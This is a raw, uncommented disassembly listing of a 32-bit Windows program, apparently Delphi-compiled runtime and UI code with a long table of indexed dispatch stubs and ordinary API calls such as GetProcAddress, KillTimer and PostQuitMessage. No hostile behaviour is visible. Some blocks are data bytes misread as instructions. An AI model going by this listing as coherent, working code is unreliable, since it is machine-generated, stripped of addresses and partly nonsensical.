sub_45b48c
push ebx
mov ebx eax
mov eax ebx
call sub_442f10
mov eax ebx
call sub_443094
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45aa8c
sub_45b702
jmp sub_4039f4
sub_45b709
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b710
push ebx
mov ebx edx
mov edx ebx
call sub_443378
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_43d30c
pop ebx
retn
sub_45b764
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45b7cc
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_45b77c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45b7cc
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_45b798
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45b7cc
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_45b7b0
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45b7cc
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_45ba4c
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45ba58
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45ba64
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45ba70
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45ba7c
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45ba88
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45ba94
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_413de4
pop esi
pop ebx
retn
sub_45baa8
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45bac4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413de4
pop esi
pop ebx
retn
sub_45bad8
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_45bae0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413de4
pop esi
pop ebx
retn
sub_45baf4
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_45bbd0
mov eax [ eax + 0x54 ]
call sub_413c88
retn
sub_45bbdc
mov eax [ eax + 0x54 ]
call sub_413f80
retn
sub_45be2f
jmp sub_4039f4
sub_45be73
jmp sub_4039f4
sub_45be7a
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_45bec8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45bcc8
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_4040c8
pop esi
pop ebx
retn
sub_45bf34
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_413de4
pop esi
pop ebx
retn
sub_45bf48
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_45c14d
jmp sub_4039f4
sub_45c154
pop ebx
mov esp ebp
pop ebp
retn
sub_45c15c
inc [ eax + 0x8c ]
retn
sub_45c164
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_45c184
sub_45c184
xor edx edx
call sub_45c5c8
retn
sub_45c5ba
jmp sub_4039f4
sub_45c641
jmp sub_4039f4
sub_45c650
add eax 0x30
call sub_40d01c
retn
sub_45c694
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
j_sub_403740#6
jmp sub_403740
sub_45c6ea
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_45dfe8
call sub_403aa8
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_45cdb9
jmp sub_4039f4
sub_45cdc0
pop ebx
mov esp ebp
pop ebp
retn
sub_45cf48
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_45cf74
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_45cfa0
xor edx edx
call sub_45ce98
retn
sub_45cfa8
mov dl 0x1
call sub_45ce98
retn
sub_45d01c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_45d034
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_45d101
jmp sub_4039f4
sub_45d108
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403740#5
jmp sub_403740
sub_45de50
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
sub_45dea6
jmp sub_403740
j_sub_403740#4
jmp sub_403740
sub_45dfc6
jmp sub_4039f4
sub_45dfcd
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45dfd4
call sub_40cb6c
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_45e1cd
jmp sub_4039f4
sub_45e1d4
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45e29b
jmp sub_4039f4
sub_45e2a2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45e478
jmp sub_4039f4
sub_45e47f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45e4e0
jmp sub_4039f4
sub_45e4e7
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45e4f0
call sub_45e2b8
retn
sub_45e6db
jmp sub_403740
sub_45e734
jmp sub_4039f4
sub_45e73b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45e869
jmp sub_4039f4
sub_45e9c8
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_45ecc7
jmp sub_4039f4
sub_45ecf6
jmp sub_4039f4
sub_45ee02
jmp sub_4039f4
sub_45ee09
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45f19a
jmp sub_4039f4
sub_45f1a1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45f2c4
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_45f30f
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_45f320
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_45f330
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_45f3a3
jmp sub_4039f4
sub_45f3aa
pop ebp
retn
sub_460019
jmp sub_4039f4
sub_460020
pop ebp
retn
sub_460024
sub [ rw-data ] 0x1
retn
sub_4602d1
jmp sub_4039f4
sub_4602d8
pop ebp
retn
sub_4602dc
sub [ rw-data ] 0x1
retn
sub_4603fc
jmp sub_4039f4
sub_460434
push 0x0
push rw-data
call InterlockedExchange
test eax eax
je r-xdata
retn
push eax
call FreeLibrary
call sub_461294
sub_460450
mov eax 0x0
call sub_4611e0
jmp eax
sub_46045c
retn
sub_460460
mov eax 0x1
call sub_4611e0
jmp eax
sub_46046c
retn
sub_460470
mov eax 0x2
call sub_4611e0
jmp eax
sub_46047c
retn
sub_460480
mov eax 0x3
call sub_4611e0
jmp eax
sub_46048c
retn
sub_460490
mov eax 0x4
call sub_4611e0
jmp eax
sub_46049c
retn
sub_4604a0
mov eax 0x5
call sub_4611e0
jmp eax
sub_4604ac
retn
sub_4604b0
mov eax 0x6
call sub_4611e0
jmp eax
sub_4604bc
retn
sub_4604c0
mov eax 0x7
call sub_4611e0
jmp eax
sub_4604cc
retn
sub_4604d0
mov eax 0x8
call sub_4611e0
jmp eax
sub_4604dc
retn
sub_4604e0
mov eax 0x9
call sub_4611e0
jmp eax
sub_4604ec
retn
sub_4604f0
mov eax 0xa
call sub_4611e0
jmp eax
sub_4604fc
retn
sub_460500
mov eax 0xb
call sub_4611e0
jmp eax
sub_46050c
retn
sub_460510
mov eax 0xc
call sub_4611e0
jmp eax
sub_46051c
retn
sub_460520
mov eax 0xd
call sub_4611e0
jmp eax
sub_46052c
retn
sub_460530
mov eax 0xe
call sub_4611e0
jmp eax
sub_46053c
retn
sub_460540
mov eax 0xf
call sub_4611e0
jmp eax
sub_46054c
retn
sub_460550
mov eax 0x10
call sub_4611e0
jmp eax
sub_46055c
retn
sub_460560
mov eax 0x11
call sub_4611e0
jmp eax
sub_46056c
retn
sub_460570
mov eax 0x12
call sub_4611e0
jmp eax
sub_46057c
retn
sub_460580
mov eax 0x13
call sub_4611e0
jmp eax
sub_46058c
retn
sub_460590
mov eax 0x14
call sub_4611e0
jmp eax
sub_46059c
retn
sub_4605a0
mov eax 0x15
call sub_4611e0
jmp eax
sub_4605ac
retn
sub_4605b0
mov eax 0x16
call sub_4611e0
jmp eax
sub_4605bc
retn
sub_4605c0
mov eax 0x17
call sub_4611e0
jmp eax
sub_4605cc
retn
sub_4605d0
mov eax 0x18
call sub_4611e0
jmp eax
sub_4605dc
retn
sub_4605e0
mov eax 0x19
call sub_4611e0
jmp eax
sub_4605ec
retn
sub_4605f0
mov eax 0x1a
call sub_4611e0
jmp eax
sub_4605fc
retn
sub_460600
mov eax 0x1b
call sub_4611e0
jmp eax
sub_46060c
retn
sub_460610
mov eax 0x1c
call sub_4611e0
jmp eax
sub_46061c
retn
sub_460620
mov eax 0x1d
call sub_4611e0
jmp eax
sub_46062c
retn
sub_460630
mov eax 0x1e
call sub_4611e0
jmp eax
sub_46063c
retn
sub_460640
mov eax 0x1f
call sub_4611e0
jmp eax
sub_46064c
retn
sub_460650
mov eax 0x20
call sub_4611e0
jmp eax
sub_46065c
retn
sub_460660
mov eax 0x21
call sub_4611e0
jmp eax
sub_46066c
retn
sub_460670
mov eax 0x22
call sub_4611e0
jmp eax
sub_46067c
retn
sub_460680
mov eax 0x23
call sub_4611e0
jmp eax
sub_46068c
retn
sub_460690
mov eax 0x24
call sub_4611e0
jmp eax
sub_46069c
retn
sub_4606a0
mov eax 0x25
call sub_4611e0
jmp eax
sub_4606ac
retn
sub_4606b0
mov eax 0x26
call sub_4611e0
jmp eax
sub_4606bc
retn
sub_4606c0
mov eax 0x27
call sub_4611e0
jmp eax
sub_4606cc
retn
sub_4606d0
mov eax 0x28
call sub_4611e0
jmp eax
sub_4606dc
retn
sub_4606e0
mov eax 0x29
call sub_4611e0
jmp eax
sub_4606ec
retn
sub_4606f0
mov eax 0x2a
call sub_4611e0
jmp eax
sub_4606fc
retn
sub_460700
mov eax 0x2b
call sub_4611e0
jmp eax
sub_46070c
retn
sub_460710
mov eax 0x2c
call sub_4611e0
jmp eax
sub_46071c
retn
sub_460720
mov eax 0x2d
call sub_4611e0
jmp eax
sub_46072c
retn
sub_460730
mov eax 0x2e
call sub_4611e0
jmp eax
sub_46073c
retn
sub_460740
mov eax 0x2f
call sub_4611e0
jmp eax
sub_46074c
retn
sub_460750
mov eax 0x30
call sub_4611e0
jmp eax
sub_46075c
retn
sub_460760
mov eax 0x31
call sub_4611e0
jmp eax
sub_46076c
retn
sub_460770
mov eax 0x32
call sub_4611e0
jmp eax
sub_46077c
retn
sub_460780
mov eax 0x33
call sub_4611e0
jmp eax
sub_46078c
retn
sub_460790
mov eax 0x34
call sub_4611e0
jmp eax
sub_46079c
retn
sub_4607a0
mov eax 0x35
call sub_4611e0
jmp eax
sub_4607ac
retn
sub_4607b0
mov eax 0x36
call sub_4611e0
jmp eax
sub_4607bc
retn
sub_4607c0
mov eax 0x37
call sub_4611e0
jmp eax
sub_4607cc
retn
sub_4607d0
mov eax 0x38
call sub_4611e0
jmp eax
sub_4607dc
retn
sub_4607e0
mov eax 0x39
call sub_4611e0
jmp eax
sub_4607ec
retn
sub_4607f0
mov eax 0x3a
call sub_4611e0
jmp eax
sub_4607fc
retn
sub_460800
mov eax 0x3b
call sub_4611e0
jmp eax
sub_46080c
retn
sub_460810
mov eax 0x3c
call sub_4611e0
jmp eax
sub_46081c
retn
sub_460820
mov eax 0x3d
call sub_4611e0
jmp eax
sub_46082c
retn
sub_460830
mov eax 0x3e
call sub_4611e0
jmp eax
sub_46083c
retn
sub_460840
mov eax 0x3f
call sub_4611e0
jmp eax
sub_46084c
retn
sub_460850
mov eax 0x40
call sub_4611e0
jmp eax
sub_46085c
retn
sub_460860
mov eax 0x41
call sub_4611e0
jmp eax
sub_46086c
retn
sub_460870
mov eax 0x42
call sub_4611e0
jmp eax
sub_46087c
retn
sub_460880
mov eax 0x43
call sub_4611e0
jmp eax
sub_46088c
retn
sub_460890
mov eax 0x44
call sub_4611e0
jmp eax
sub_46089c
retn
sub_4608a0
mov eax 0x45
call sub_4611e0
jmp eax
sub_4608ac
retn
sub_4608b0
mov eax 0x46
call sub_4611e0
jmp eax
sub_4608bc
retn
sub_4608c0
mov eax 0x47
call sub_4611e0
jmp eax
sub_4608cc
retn
sub_4608d0
mov eax 0x48
call sub_4611e0
jmp eax
sub_4608dc
retn
sub_4608e0
mov eax 0x49
call sub_4611e0
jmp eax
sub_4608ec
retn
sub_4608f0
mov eax 0x4a
call sub_4611e0
jmp eax
sub_4608fc
retn
sub_460900
mov eax 0x4b
call sub_4611e0
jmp eax
sub_46090c
retn
sub_460910
mov eax 0x4c
call sub_4611e0
jmp eax
sub_46091c
retn
sub_460920
mov eax 0x4d
call sub_4611e0
jmp eax
sub_46092c
retn
sub_460930
mov eax 0x4e
call sub_4611e0
jmp eax
sub_46093c
retn
sub_460940
mov eax 0x4f
call sub_4611e0
jmp eax
sub_46094c
retn
sub_460950
mov eax 0x50
call sub_4611e0
jmp eax
sub_46095c
retn
sub_460960
mov eax 0x51
call sub_4611e0
jmp eax
sub_46096c
retn
sub_460970
mov eax 0x52
call sub_4611e0
jmp eax
sub_46097c
retn
sub_460980
mov eax 0x53
call sub_4611e0
jmp eax
sub_46098c
retn
sub_460990
mov eax 0x54
call sub_4611e0
jmp eax
sub_46099c
retn
sub_4609a0
mov eax 0x55
call sub_4611e0
jmp eax
sub_4609ac
retn
sub_4609b0
mov eax 0x56
call sub_4611e0
jmp eax
sub_4609bc
retn
sub_4609c0
mov eax 0x57
call sub_4611e0
jmp eax
sub_4609cc
retn
sub_4609d0
mov eax 0x58
call sub_4611e0
jmp eax
sub_4609dc
retn
sub_4609e0
mov eax 0x59
call sub_4611e0
jmp eax
sub_4609ec
retn
sub_4609f0
mov eax 0x5a
call sub_4611e0
jmp eax
sub_4609fc
retn
sub_460a00
mov eax 0x5b
call sub_4611e0
jmp eax
sub_460a0c
retn
sub_460a10
mov eax 0x5c
call sub_4611e0
jmp eax
sub_460a1c
retn
sub_460a20
mov eax 0x5d
call sub_4611e0
jmp eax
sub_460a2c
retn
sub_460a30
mov eax 0x5e
call sub_4611e0
jmp eax
sub_460a3c
retn
sub_460a40
mov eax 0x5f
call sub_4611e0
jmp eax
sub_460a4c
retn
sub_460a50
mov eax 0x60
call sub_4611e0
jmp eax
sub_460a5c
retn
sub_460a60
mov eax 0x61
call sub_4611e0
jmp eax
sub_460a6c
retn
sub_460a70
mov eax 0x62
call sub_4611e0
jmp eax
sub_460a7c
retn
sub_460a80
mov eax 0x63
call sub_4611e0
jmp eax
sub_460a8c
retn
sub_460a90
mov eax 0x64
call sub_4611e0
jmp eax
sub_460a9c
retn
sub_460aa0
mov eax 0x65
call sub_4611e0
jmp eax
sub_460aac
retn
sub_460ab0
mov eax 0x66
call sub_4611e0
jmp eax
sub_460abc
retn
sub_460ac0
mov eax 0x67
call sub_4611e0
jmp eax
sub_460acc
retn
sub_460ad0
mov eax 0x68
call sub_4611e0
jmp eax
sub_460adc
retn
sub_460ae0
mov eax 0x69
call sub_4611e0
jmp eax
sub_460aec
retn
sub_460af0
mov eax 0x6a
call sub_4611e0
jmp eax
sub_460afc
retn
sub_460b00
mov eax 0x6b
call sub_4611e0
jmp eax
sub_460b0c
retn
sub_460b10
mov eax 0x6c
call sub_4611e0
jmp eax
sub_460b1c
retn
sub_460b20
mov eax 0x6d
call sub_4611e0
jmp eax
sub_460b2c
retn
sub_460b30
mov eax 0x6e
call sub_4611e0
jmp eax
sub_460b3c
retn
sub_460b40
mov eax 0x6f
call sub_4611e0
jmp eax
sub_460b4c
retn
sub_461283
jmp sub_4039f4
sub_46128a
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461385
jmp sub_4039f4
sub_46138c
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4613f0
jmp sub_4039f4
sub_4613f7
pop ebp
retn
sub_4613fc
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_461294
sub_461431
jmp sub_4039f4
sub_461438
pop ebp
retn
sub_46143c
sub [ rw-data ] 0x1
retn
sub_4616c8
push 0xffffffff
lea ecx [ esp + 0x4 ]
call sub_4616d4
retn
sub_46177b
jmp sub_4039f4
sub_461782
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4617da
jmp sub_4039f4
sub_4617e1
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4617e8
test dl dl
je r-xdata
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_461808
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0xc ]
retn
sub_461c86
jmp sub_4039f4
sub_461c8d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461d7f
jmp sub_4039f4
sub_461d86
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_461e14
jmp sub_4039f4
sub_461e1b
mov eax [ ebp - 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_461e49
jmp sub_4039f4
sub_461e50
pop ebp
retn
sub_461e54
sub [ rw-data ] 0x1
retn
sub_46204e
jmp sub_4039f4
sub_462055
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_462130
jmp sub_4039f4
sub_462137
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4621cb
jmp sub_4039f4
sub_4621d2
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_462248
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46238c
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46243f
jmp sub_4039f4
sub_462446
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_462521
jmp sub_4039f4
sub_462528
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462714
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_462720
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x4
sub_462738
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_462744
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
j_sub_40386c
jmp sub_40386c
sub_4627c5
add [ eax ] eax
add [ eax ] al
mov al [ 0xffffffffd1004076 ]
daa
inc esi
add [ ebx + 0x4589fc45 ] cl
hlt
sub_46281d
jmp sub_4039f4
sub_462824
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403740#3
jmp sub_403740
sub_46294d
jmp sub_4039f4
sub_462954
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462960
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46296c
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_462a12
jmp sub_4039f4
sub_462a19
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462ad5
jmp sub_4039f4
sub_462adc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462af9
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_462af2
jmp sub_4039f4
sub_462af9
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_462bc7
jmp sub_4039f4
sub_462bce
pop ebx
mov esp ebp
pop ebp
retn
sub_462bd7
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ecx + 0x52 ] dl
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_462c7a
jmp sub_4039f4
sub_462c81
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_462d1a
jmp sub_4039f4
sub_462d21
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_462da6
jmp sub_4039f4
sub_462dad
pop ecx
pop ebp
retn
sub_462db0
mov eax [ eax + 0x4 ]
retn
sub_462e0e
jmp sub_4039f4
sub_462e15
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_462ef1
jmp sub_4039f4
sub_462ef8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462f39
jmp sub_4039f4
sub_462f40
pop ebp
retn
sub_462f44
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_462a3c
sub_462f95
jmp sub_4039f4
sub_462f9c
pop ebp
retn
sub_462fa0
sub [ rw-data ] 0x1
retn
sub_463114
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_40c2d4
pop esi
pop ebx
retn
sub_463128
cmp edx eax
jge r-xdata
retn
mov eax edx
sub_463273
jmp sub_4039f4
sub_46327a
pop ebx
pop ecx
pop ebp
retn
sub_463349
jmp sub_4039f4
sub_463350
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_463420
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
sete al
retn
sub_463434
call sub_404678
retn
sub_46357b
jmp sub_4039f4
sub_463582
pop ebp
retn
sub_463657
jmp sub_4039f4
sub_46365e
pop ecx
pop ebp
retn
sub_46378c
retn
j_sub_46378c
jmp sub_46378c
sub_463794
pop ebp
retn
sub_463798
sub [ rw-data ] 0x1
retn
sub_463997
jmp sub_4039f4
sub_46399e
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_463a79
jmp sub_4039f4
sub_463a80
pop ebp
retn
sub_463a84
sub [ rw-data ] 0x1
retn
sub_463e12
jmp sub_4039f4
sub_463e19
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_463e9f
jmp sub_4039f4
sub_463ea6
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403614
sub_463f6f
jmp sub_4039f4
sub_463f76
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4640a0
jmp sub_4039f4
sub_4640a7
pop ebp
retn
sub_4640ac
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d9c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4266c4
mov [ rw-data ] eax
sub_464664
jmp sub_4039f4
sub_46466b
pop ebx
mov esp ebp
pop ebp
retn
sub_4647f8
jmp sub_4039f4
sub_464815
jmp sub_4039f4
sub_46481c
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_464995
jmp sub_4039f4
sub_46499c
pop ebp
retn
sub_4649a0
sub [ rw-data ] 0x1
retn
sub_464cc8
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_464cdc
mov edx [ eax + 0x34 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x44 ]
sub_464cec
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_464d00
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4c ]
sub_464d39
jmp sub_4039f4
sub_464d40
pop ebp
retn
sub_464d44
sub [ rw-data ] 0x1
retn
sub_464e30
retn
sub_464e34
push ebp
mov ebp esp
pop ebp
retn 0x14
sub_464e68
retn
sub_464e6c
retn
sub_464e95
jmp sub_4039f4
sub_464e9c
pop ebp
retn
sub_464ea0
sub [ rw-data ] 0x1
retn
sub_465010
push ebx
mov ebx eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebx + 0x14 ]
call sub_404074
pop ebx
retn
sub_4651a3
jmp sub_4039f4
sub_4651aa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4651ff
jmp sub_4039f4
sub_465206
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46520c
push esi
mov esi eax
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_46526d
jmp sub_4039f4
sub_465274
pop ebp
retn
sub_465278
sub [ rw-data ] 0x1
retn
sub_4652a5
jmp sub_4039f4
sub_4652ac
pop ebp
retn
sub_4652b0
sub [ rw-data ] 0x1
retn
sub_4657b9
jmp sub_4039f4
sub_4657c0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_40386c#2
jmp sub_40386c
sub_465895
jmp [ ecx + rw-data ]
j_sub_40386c#3
jmp sub_40386c
sub_465b0b
jmp sub_403740
sub_465bb6
sub_465dfd
jmp sub_4039f4
sub_465e04
pop ebp
retn
sub_465e08
sub [ rw-data ] 0x1
retn
sub_465e35
jmp sub_4039f4
sub_465e3c
pop ebp
retn
sub_465e40
sub [ rw-data ] 0x1
retn
sub_465e6d
jmp sub_4039f4
sub_465e74
pop ebp
retn
sub_465e78
sub [ rw-data ] 0x1
retn
sub_466199
jmp sub_4039f4
sub_4661a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4661bd
lea eax [ ebp - 0x8 ]
call sub_404074
retn
sub_4661b6
jmp sub_4039f4
sub_4661bd
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_466395
jmp sub_4039f4
sub_46639c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_4663a8
mov ecx [ eax + 0x68 ]
test ecx ecx
setne dl
test dl dl
je r-xdata
mov eax edx
retn
mov dl [ ecx + 0x10 ]
sub_466428
mov eax [ eax + 0x68 ]
call sub_4646e4
retn
sub_4664a4
jmp sub_4039f4
sub_4664ab
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_466524
jmp sub_4039f4
sub_46652b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_40386c#4
jmp sub_40386c
sub_4666e1
jmp sub_4039f4
sub_4666e8
pop ebp
retn
sub_4666ec
sub [ rw-data ] 0x1
retn
sub_466d40
jmp sub_4039f4
sub_466d47
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466d64
lea eax [ ebp - 0x8 ]
call sub_404074
retn
sub_466d5d
jmp sub_4039f4
sub_466d64
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_466e30
jmp sub_4039f4
sub_466e37
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_466fe8
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_467081
jmp sub_4039f4
sub_467088
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4670e6
jmp sub_4039f4
sub_4670ed
pop esi
pop ebx
pop ecx
